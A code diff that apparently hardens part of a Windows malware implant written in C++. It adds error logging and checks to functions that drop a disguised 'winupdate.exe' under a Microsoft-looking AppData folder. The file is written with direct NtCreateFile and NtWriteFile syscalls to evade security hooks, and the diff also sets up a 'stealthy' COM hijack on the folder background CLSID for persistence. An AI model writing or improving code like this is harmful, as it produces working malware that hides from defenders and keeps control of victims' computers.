@@ -26,8 +26,6 @@ std::wstring getPersistPath() {
     }
 
     std::wstring dir = std::wstring(localAppData) + L"\\Microsoft\\Windows\\Update";
-    // We can use a Win32 call for directory creation as it's less suspicious than registry
-    // but for full stealth we could use NtCreateFile.
     CreateDirectoryW(dir.c_str(), NULL);
 
     return dir + L"\\winupdate.exe";
@@ -39,7 +37,10 @@ bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data)
     DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
     DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
 
-    if (ntCreateFileSsn == 0xFFFFFFFF || ntWriteFileSsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;
+    if (ntCreateFileSsn == 0xFFFFFFFF || ntWriteFileSsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) {
+        LOG_ERR("Syscall resolution failed for file operations.");
+        return false;
+    }
 
     UNICODE_STRING uPath;
     uPath.Buffer = (PWSTR)ntPath.c_str();
@@ -51,6 +52,7 @@ bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data)
 
     HANDLE hFile = NULL;
     IO_STATUS_BLOCK ioStatus;
+    RtlZeroMemory(&ioStatus, sizeof(ioStatus));
 
     NTSTATUS status = InternalDoSyscall(ntCreateFileSsn,
         &hFile,
@@ -65,9 +67,16 @@ bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data)
         NULL,
         (PVOID)(UINT_PTR)0);
 
-    if (!NT_SUCCESS(status)) return false;
+    if (!NT_SUCCESS(status)) {
+        LOG_ERR("NtCreateFile failed with status: 0x" + utils::Shared::ToHex((unsigned int)status));
+        return false;
+    }
 
     status = InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (PVOID)(UINT_PTR)(ULONG)data.size(), NULL, NULL, NULL, NULL);
+
+    if (!NT_SUCCESS(status)) {
+        LOG_ERR("NtWriteFile failed with status: 0x" + utils::Shared::ToHex((unsigned int)status));
+    }
 
     InternalDoSyscall(ntCloseSsn, hFile, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
     return NT_SUCCESS(status);
@@ -78,6 +87,10 @@ std::vector<BYTE> ReadFileBinary(const std::wstring& path) {
     if (hFile == INVALID_HANDLE_VALUE) return {};
 
     DWORD size = GetFileSize(hFile, NULL);
+    if (size == INVALID_FILE_SIZE) {
+        CloseHandle(hFile);
+        return {};
+    }
     std::vector<BYTE> buffer(size);
     DWORD read = 0;
     ReadFile(hFile, buffer.data(), size, &read, NULL);
@@ -122,7 +135,6 @@ bool establishPersistence() {
     }
 
     // Stealthy COM Hijack: Folder Background menu
-    // {00021400-0000-0000-C000-000000000046}
     std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
 
     LOG_INFO("Attempting COM Hijack for " + utils::ws2s(clsid));
